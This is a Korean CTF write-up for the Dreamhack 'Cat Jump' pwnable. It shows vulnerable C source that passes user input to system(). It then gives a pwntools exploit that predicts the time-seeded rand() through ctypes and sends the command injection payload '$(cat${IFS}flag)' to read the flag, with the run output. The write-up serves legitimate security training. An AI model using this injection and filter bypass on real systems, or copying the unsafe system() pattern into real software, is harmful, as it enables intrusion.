---
title: "[Dreamhack CTF Season 2 #11] Cat Jump writeup"
date: 2023-01-29 21:56:00 +0900
categories: [CTF, PWNABLE]
tags: [ctf]
author: R99bbit
---
소스코드가 주어지는 문제이다.

```c
/* cat_jump.c
 * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump
*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define CAT_JUMP_GOAL 37

#define CATNIP_PROBABILITY 0.1
#define CATNIP_INVINCIBLE_TIMES 3

#define OBSTACLE_PROBABILITY 0.5
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

void PrintBanner() {
    puts("                         .-.\n" \
         "                          \\ \\\n" \
         "                           \\ \\\n" \
         "                            | |\n" \
         "                            | |\n" \
         "          /\\---/\\   _,---._ | |\n" \
         "         /^   ^  \\,'       `. ;\n" \
         "        ( O   O   )           ;\n" \
         "         `.=o=__,'            \\\n" \
         "           /         _,--.__   \\\n" \
         "          /  _ )   ,'   `-. `-. \\\n" \
         "         / ,' /  ,'        \\ \\ \\ \\\n" \
         "        / /  / ,'          (,_)(,_)\n" \
         "       (,;  (,,)      jrei\n");
}

char cmd_fmt[] = "echo \"%s\" > /tmp/cat_db";

void StartGame() {
    char cat_name[32];
    char catnip;
    char cmd[64];
    char input;
    char obstacle;
    double p;
    unsigned char jump_cnt;

    srand(time(NULL));

    catnip = 0;
    jump_cnt = 0;

    puts("let the cat reach the roof! 🐈");
    sleep(1);

    do {
        // set obstacle with a specific probability.
        obstacle = rand() % 2;

        // get input.
        do {
            printf("left jump='h', right jump='j': ");
            scanf("%c%*c", &input);
        } while (input != 'h' && input != 'l');

        // jump.
        if (catnip) {
            catnip--;
            jump_cnt++;
            puts("the cat powered up and is invincible! nothing cannot stop! 🐈");
        } else if ((input == 'h' && obstacle != OBSTACLE_LEFT) ||
                (input == 'l' && obstacle != OBSTACLE_RIGHT)) {
            jump_cnt++;
            puts("the cat jumped successfully! 🐱");
        } else {
            puts("the cat got stuck by obstacle! 😿 🪨 ");
            return;
        }

        // eat some catnip with a specific probability.
        p = (double)rand() / RAND_MAX;
        if (p < CATNIP_PROBABILITY) {
            puts("the cat found and ate some catnip! 😽");
            catnip = CATNIP_INVINCIBLE_TIMES;
        }
    } while (jump_cnt < CAT_JUMP_GOAL);

    puts("your cat has reached the roof!\n");

    printf("let people know your cat's name 😼: ");
    scanf("%31s", cat_name);

    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);
    system(cmd);

    printf("goodjob! ");
    system("cat /tmp/cat_db");
}

int main(void) {
    Init();
    PrintBanner();
    StartGame();

    return 0;
}
```

random 으로 생성되는 값에 따라 생성되는 왼쪽/오른쪽 정답을 37회 맞추면 command injection을 수행할 수 있다.

```c
// L42
char cmd_fmt[] = "echo \"%s\" > /tmp/cat_db";
```

```c
// L98
    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);
    system(cmd);

    printf("goodjob! ");
    system("cat /tmp/cat_db");
```

이제, 고양이가 점프하는 게임을 37회 이겨야 하는데, 정답을 생성하는 랜덤 함수가 `srand(time(NULL))` 및 `rand()` 이다.

즉, 정답을 만드는 함수의 시드가 시간이기 때문에 서버에 접속하는 동시에 time seed를 만들어내고, pythoon ctypes로 rand()를 호출해주면 서버와 동일한 결과 값을 획득할 수 있다.

다만, 여기서 주의해야할 점은 만약 `srand(time(NULL))` 에 의해 값이 [1, 2, 3, 4, 5] 로 만들어졌을 경우 값을 하나씩 iterate 하여 사용하는데(1, 2, 3, 4, 5, ...), 고양이 점프 게임에서는 한 루프에 `rand()`를 (1) 답을 입력 받기 전, (2) 답을 입력한 후에 캣닢을 줄지 말지 결정하는 루틴 총 두번 수행한다.

때문에 exploit할 때 한 루프에 `rand()` 가 두번 호출될 수 있도록 작성해야 한다.

풀이는 아래와 같다.

```python
from pwn import *
from ctypes import *
from ctypes.util import find_library
import base64
import time


p = remote('host3.dreamhack.games', 17969)
# p = process('./deploy/cat_jump')

c = CDLL(find_library('/lib/x86_64-linux-gnu/libc.so.6'))
c.srand(c.time(0))

obstacle = c.rand() % 2

p.recvuntil(b"left jump='h', right jump='j':")

if obstacle == 0:
    p.sendline(bytes('l', 'utf-8'))
elif obstacle == 1:
    p.sendline(bytes('h', 'utf-8'))

for i in range(36):
    try:
        recv = p.recvuntil(b":")
        c.rand()
        obstacle = c.rand() % 2
        print(recv.decode('utf-8'))
    except:
        print()
        p.interactive()

    if(obstacle == 0):
        p.sendline(bytes('l', 'utf-8'))
    if(obstacle == 1):
        p.sendline(bytes('h', 'utf-8'))

recv = p.recvuntil(b": ")
print(recv)
p.sendline(bytes('$(cat${IFS}flag)', 'utf-8'))
p.interactive()
```

command injeciton 하는 부분은 echo에 들어가는 문자열을 command substitution 하여 flag를 읽을 수 있도록 해주자. 문제 바이너리에서는 해당 부분에 띄어쓰기를 허용하지 않으므로 `${IFS}` 를 사용하는 등 잘 우회해보자.

```
 the cat jumped successfully! 🐱
left jump='h', right jump='j':
 the cat jumped successfully! 🐱
left jump='h', right jump='j':
 the cat jumped successfully! 🐱
left jump='h', right jump='j':
 the cat jumped successfully! 🐱
left jump='h', right jump='j':
 the cat jumped successfully! 🐱
the cat found and ate some catnip! 😽
left jump='h', right jump='j':
 the cat powered up and is invincible! nothing cannot stop! 🐈
left jump='h', right jump='j':
 the cat powered up and is invincible! nothing cannot stop! 🐈
left jump='h', right jump='j':
 the cat powered up and is invincible! nothing cannot stop! 🐈
left jump='h', right jump='j':
your cat has reached the roof!
let people know your cat's name 😼: 
[*] Switching to interactive mode
goodjob! DH{da65478323e88390957aee8177eb3cf6e60a2a6b486a76d46fc4d94ec785bb48}
[*] Got EOF while reading in interactive
```